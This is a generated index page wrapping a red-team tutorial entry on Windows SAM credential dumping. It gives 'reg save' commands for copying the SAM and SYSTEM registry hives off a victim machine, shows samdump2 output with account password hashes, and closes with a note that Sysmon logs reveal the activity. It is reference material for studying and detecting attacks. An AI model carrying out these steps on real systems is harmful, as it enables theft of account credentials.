---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Security Accounts Manager

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-credential-access-and-credential-dumping-sam` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/sam.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Security Accounts Manager](../../topics/offensive-security/security-accounts-manager.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-credential-access-and-credential-dumping-sam |
| name | Security Accounts Manager |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/credential-access-and-credential-dumping/sam.md |

## Preserved Source Material

````yaml
_asset_filenames:
- pwdump-reg-sysmon.png
_body: "---\ndescription: >-\n  Security Accounts Manager (SAM) credential dumping with living off the land\n  binary.\n---\n\
  \n# Security Accounts Manager\n\n## Execution\n\nDumping the registry hives required for hash extraction:\n\n{% code-tabs\
  \ %}\n{% code-tabs-item title=\"attacker@victim\" %}\n```text\nreg save hklm\\system system\nreg save hklm\\sam sam\n```\n\
  {% endcode-tabs-item %}\n{% endcode-tabs %}\n\nOnce the files are dumped and exfiltrated, we can dump hashes with samdump2\
  \ on kali:\n\n{% code-tabs %}\n{% code-tabs-item title=\"attacker@local\" %}\n```text\nroot@~/tools/mitre/pwdump# samdump2\
  \ system sam \n*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n*disabled*\
  \ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nHomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:9f288c9a9aee917e19d4b21928b98268:::\n\
  low:1003:aad3b435b51404eeaad3b435b51404ee:4bdaf9484819a077562ebeefaed6ca75:::\n```\n{% endcode-tabs-item %}\n{% endcode-tabs\
  \ %}\n\n## Observations\n\nSysmon logs with commandlines will reveal credential dump attempts from the registry as expected:\n\
  \n![](../../.gitbook/assets/pwdump-reg-sysmon.png)"
_relative_path: offensive-security/credential-access-and-credential-dumping/sam.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/sam.md
````
